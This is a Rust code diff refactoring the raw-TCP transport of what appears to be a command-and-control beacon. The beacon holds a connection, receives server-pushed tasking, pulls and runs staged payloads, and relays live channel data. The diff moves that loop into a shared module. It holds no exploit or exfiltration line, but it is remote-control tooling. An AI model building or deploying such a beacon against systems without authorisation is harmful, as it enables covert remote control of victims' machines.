@@ -2,13 +2,12 @@ use std::io::{Read, Write};
 use std::net::TcpStream;
 use std::time::Duration;
 
-use prost::Message;
-
+use super::live::{self, LiveChannel};
 use super::Contact;
 use crate::error::ContactError;
 use crate::profile::Profile;
 use crate::session::{Attempt, Session};
-use crate::wire::{Frame, FrameKind, StagedChunk, TaskRequest};
+use crate::wire::Frame;
 
 // The raw-TCP carriage (architecture.md Sec 8, the socket family): the same
 // contact flow the envelope POST cycle runs, over a bare TCP connection
@@ -23,7 +22,8 @@ use crate::wire::{Frame, FrameKind, StagedChunk, TaskRequest};
 // response message carries the answer, staged answers, tasking, and the
 // degraded channel input -- and closes; a stream build advertises the live
 // capability and holds the connection, the server pushing tasking the
-// moment it queues (the same session runner the WebSocket beacon runs).
+// moment it queues (the same session runner the WebSocket beacon runs, and
+// the same held-session discipline it runs).
 
 /// The handshake capability that switches a socket connection from the poll
 /// exchange to the held live session (the server's LiveSessionCapability).
@@ -36,10 +36,6 @@ const MAX_MESSAGE_BYTES: usize = 8 * 1024 * 1024;
 /// How long a message, once started, may take to complete: bounded against
 /// a dead peer, generous against a slow one.
 const MESSAGE_TIMEOUT: Duration = Duration::from_secs(30);
-
-/// The channel tick while a live channel could have queued output -- the
-/// same wake the WebSocket carriage rides, over the socket's read timeout.
-const CHANNEL_TICK: Duration = Duration::from_millis(200);
 
 pub struct RawTcp {
     address: String,
@@ -130,14 +126,11 @@ impl RawTcp {
             return Ok(attempt);
         }
 
-        // Results whose delivery may have died with an earlier connection
-        // ride this one first: the server records first-wins.
-        flush(&mut stream, session)?;
-
-        // The held loop: process each message's frames, then park on the
-        // next message -- or, while a live channel could have queued
-        // output, a short read-timeout tick that flushes it.
-        let outcome = serve_after(session, &mut stream, &inbound[1..], acks);
+        let mut channel = SocketLive {
+            stream: &mut stream,
+            tick: false,
+        };
+        let outcome = live::held_handshake(session, &mut channel, &inbound[1..], acks);
         // A dead connection ends every channel it carried (the wire
         // contract's session-scoped lifetime); their results never come.
         session.channels.reap();
@@ -155,119 +148,26 @@ impl Contact for RawTcp {
     }
 }
 
-/// One message's held frames: channel input routes to the live channel it
-/// names, a staged task pulls its payload inline (the blocking exchange the
-/// socket's request-response shape permits), tasking is accepted and
-/// flushed the moment it happens.
-fn serve_held(
-    session: &mut Session,
-    stream: &mut TcpStream,
-    frames: &[Frame],
-    acks: bool,
-) -> Result<(), ContactError> {
-    for frame in frames {
-        if frame.kind() == FrameKind::ChannelInput {
-            if let Ok(input) = crate::wire::ChannelInput::decode(frame.payload.as_ref()) {
-                session.channels.feed(&input.task_id, input.data, input.eof);
-            }
-            continue;
-        }
-        if let Ok(task) = TaskRequest::decode(frame.payload.as_ref()) {
-            if task.staged_bytes.is_some() {
-                run_staged(session, stream, &task)?;
-            } else {
-                session.accept(&task, acks);
-                flush(stream, session)?;
-            }
-        }
-    }
-    Ok(())
+/// The held session over the socket's message codec: the byte exchange the
+/// shared live discipline runs.
+struct SocketLive<'a> {
+    stream: &'a mut TcpStream,
+    tick: bool,
 }
 
-/// The held session's park: channel output is drained and flushed on every
-/// wake, and the park itself blocks while no channel is live (nothing but
-/// the server's push can wake us) or ticks while one is.
-fn serve_loop(
-    session: &mut Session,
-    stream: &mut TcpStream,
-    acks: bool,
-) -> Result<(), ContactError> {
-    loop {
-        session.drain_channels();
-        flush(stream, session)?;
-        let _ = stream.set_read_timeout(if session.channels.any_live() {
-            Some(CHANNEL_TICK)
-        } else {
-            None
-        });
-        if let Some(frames) = read_frames(session, stream, true)? {
-            serve_held(session, stream, &frames, acks)?;
-        }
+impl LiveChannel for SocketLive<'_> {
+    fn send_batch(&mut self, session: &mut Session, frames: &[Frame]) -> Result<(), ContactError> {
+        let (body, _) = session.encode_outgoing(frames);
+        write_message(self.stream, &body)
     }
-}
 
-// Chained after the opening exchange: the held loop continues over the
-// handshake message's remaining frames.
-fn serve_after(
-    session: &mut Session,
-    stream: &mut TcpStream,
-    frames: &[Frame],
-    acks: bool,
-) -> Result<(), ContactError> {
-    serve_held(session, stream, frames, acks)?;
-    serve_loop(session, stream, acks)
-}
-
-/// The staged arm on the held connection: demand the payload, then block on
-/// the messages until its terminal chunk -- nothing else interleaves on a
-/// blocking read.
-fn run_staged(
-    session: &mut Session,
-    stream: &mut TcpStream,
-    task: &TaskRequest,
-) -> Result<(), ContactError> {
-    let demand = [Frame {
-        payload: crate::wire::StagedPull {
-            task_id: task.task_id.clone(),
-        }
-        .encode_to_vec(),
-        kind: FrameKind::StagedPull as i32,
-    }];
-    let (body, _) = session.encode_outgoing(&demand);
-    write_message(stream, &body)?;
-
-    let mut payload: Vec<u8> = Vec::new();
-    loop {
-        let Some(frames) = read_frames(session, stream, false)? else {
-            return Err(ContactError::Protocol("the socket closed mid-payload"));
-        };
-        for frame in frames {
-            if let Ok(chunk) = StagedChunk::decode(frame.payload.as_ref()) {
-                if chunk.task_id == task.task_id {
-                    payload.extend_from_slice(&chunk.data);
-                    if chunk.terminal {
-                        let (outcome, output) =
-                            super::http::dispatch_staged(&task.verb, &task.arguments, &payload);
-                        session.outbox.result(&task.task_id, outcome, &output);
-                        return Ok(());
-                    }
-                }
-            }
-        }
+    fn recv(&mut self, session: &mut Session) -> Result<Option<Vec<Frame>>, ContactError> {
+        read_frames(session, self.stream, self.tick)
     }
-}
 
-/// Writes whatever the session has queued since the last write, marking it
-/// delivered: a message that left the socket counts as delivered.
-fn flush(stream: &mut TcpStream, session: &mut Session) -> Result<(), ContactError> {
-    let batch = session.outbox.batch();
-    if batch.is_empty() {
-        return Ok(());
+    fn arm_tick(&mut self, on: bool) {
+        self.tick = on;
     }
-    let (body, _) = session.encode_outgoing(&batch);
-    write_message(stream, &body)?;
-    session.outbox.batch_crossed(batch.len());
-    Ok(())
 }
 
 // --- The message codec (the socket family's StreamContactFraming): one
@@ -298,7 +198,7 @@ pub fn write_message(stream: &mut TcpStream, body: &[u8]) -> Result<(), ContactE
 pub fn read_message(stream: &mut TcpStream, ticks: bool) -> Result<Option<Vec<u8>>, ContactError> {
     stream
         .set_read_timeout(if ticks {
-            Some(CHANNEL_TICK)
+            Some(live::CHANNEL_TICK)
         } else {
             Some(MESSAGE_TIMEOUT)
         })
